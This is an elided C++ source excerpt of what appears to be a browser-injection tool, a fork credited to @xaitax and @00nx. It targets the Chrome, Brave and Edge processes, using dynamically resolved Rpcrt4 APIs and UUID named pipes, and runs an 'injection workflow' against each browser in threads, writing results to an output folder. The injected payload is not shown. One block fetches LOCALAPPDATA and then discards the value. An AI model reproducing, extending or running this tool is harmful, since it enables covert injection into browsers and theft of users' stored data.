...
// The #pragma comment(lib, ...) directives have been removed.
// Required functions are now loaded dynamically at runtime.
...
class Console; // Forward declaration for use in DynAPI

// Namespace to handle dynamically loaded Windows APIs
namespace DynAPI
{
    // Structure to hold function pointers from Rpcrt4.dll
    struct
    {
        decltype(&::UuidCreate) UuidCreate = nullptr;
        decltype(&::UuidToStringW) UuidToStringW = nullptr;
        decltype(&::RpcStringFreeW) RpcStringFreeW = nullptr;
    } Rpcrt4;

    // Helper macro for loading functions, reducing boilerplate
    #define LOAD_FUNC(h, f)                                        \
        Rpcrt4.f = (decltype(Rpcrt4.f))GetProcAddress(h, #f);       \
        if (!Rpcrt4.f) {                                           \
            console.Error("Failed to get address of " #f);         \
            return false;                                          \
        }

    // Initializes all required function pointers from their DLLs
    bool Initialize(const Console &console);
} // namespace DynAPI
...
namespace
{
    ...
    namespace Utils
    {
        ...
        std::wstring GenerateUniquePipeName()
        {
            ...
            DynAPI::Rpcrt4.UuidCreate(&uuid);
            wchar_t *uuidStrRaw = nullptr;
            // Use dynamically loaded function
            DynAPI::Rpcrt4.UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw);
            std::wstring pipeName = L"\\\\.\\pipe\\" + std::wstring(uuidStrRaw);
            // Use dynamically loaded function
            DynAPI::Rpcrt4.RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
            return pipeName;
        }
    }
}
...
public:
    ...
    void displayBanner() const
    {
        ...
        std::cout << "------------------------------------------------\n"
                  ...
                  << "|  x64 & ARM64 | v2.0 by @00nx                 |\n"
                  << "|  fork of the original by @xaitax             |\n"
                  << "------------------------------------------------\n\n";
        ResetColor();
    }
...
// Implementation of the dynamic API loader
bool DynAPI::Initialize(const Console& console) {
    console.Debug("Dynamically loading required APIs...");

    // Load Rpcrt4.dll
    HMODULE hRpcrt4 = LoadLibraryA("rpcrt4.dll");
    if (!hRpcrt4) {
        console.Error("Failed to load rpcrt4.dll. Error: " + std::to_string(GetLastError()));
        return false;
    }

    // Load functions from Rpcrt4.dll
    LOAD_FUNC(hRpcrt4, UuidCreate);
    LOAD_FUNC(hRpcrt4, UuidToStringW);
    LOAD_FUNC(hRpcrt4, RpcStringFreeW);

    // NOTE: The other pragmas (shell32.lib, version.lib, user32.lib) were removed
    // as no functions from their corresponding DLLs were used in this source file.
    // If they were needed, they would be loaded here in a similar fashion.

    console.Debug("Successfully loaded dynamic APIs.");
    return true;
}
...
int wmain(int argc, wchar_t *argv[])
{
    ...
    // Initialize dynamically loaded APIs before any other operations
    if (!DynAPI::Initialize(console))
    {
        // Error message is printed by the Initialize function
        return 1;
    }
    ...
    // Build configs for multiple browsers
    std::vector<Configuration> configs;
    {
        auto makeConfig = [&](std::wstring type) -> std::optional<Configuration> {
            Configuration cfg;
            cfg.verbose = isVerbose;
            cfg.outputPath = fs::current_path() / "output";
            cfg.browserType = type;
            std::transform(cfg.browserType.begin(), cfg.browserType.end(), cfg.browserType.begin(), ::towlower);

wchar_t* localAppData = nullptr;
if (_wdupenv_s(&localAppData, nullptr, L"LOCALAPPDATA") == 0 && localAppData)
{
    std::wstring path = localAppData;
    free(localAppData); // must free after use
}
            ...
            auto it = browserMap.find(cfg.browserType);
            if (it == browserMap.end())
            {
                console.Warn("Browser type not found in map: " + Utils::WStringToUtf8(type));
                return std::nullopt;
            }

            cfg.browserProcessName = it->second.first;
            cfg.browserDefaultExePath = it->second.second;

            // Skip if exe not found
            if (!fs::exists(cfg.browserDefaultExePath))
            {
                console.Warn("Skipping " + Utils::WStringToUtf8(type) + " — executable not found at: " + Utils::WStringToUtf8(cfg.browserDefaultExePath));
                return std::nullopt;
            }

            std::string displayName = Utils::WStringToUtf8(cfg.browserType);
            displayName[0] = static_cast<char>(std::toupper(displayName[0]));
            cfg.browserDisplayName = displayName;
            return cfg;
        };

        if (auto cfg = makeConfig(L"chrome"))    configs.push_back(*cfg);
        if (auto cfg = makeConfig(L"brave"))    configs.push_back(*cfg);
        if (auto cfg = makeConfig(L"edge"))     configs.push_back(*cfg);
    }
    ...
    std::error_code ec;
    fs::create_directories(fs::current_path() / "output", ec);
    if (ec)
    {
        console.Error("Failed to create output directory: " + ec.message());
        return 1;
    }

    // Launch all browsers simultaneously in threads
    ...
    for (auto &cfg : configs)
    {
        threads.emplace_back([&, cfg]() {
            try
            {
                RunInjectionWorkflow(cfg, console);
            }
    ...
    console.Debug("All injections finished.");
    return 0;
}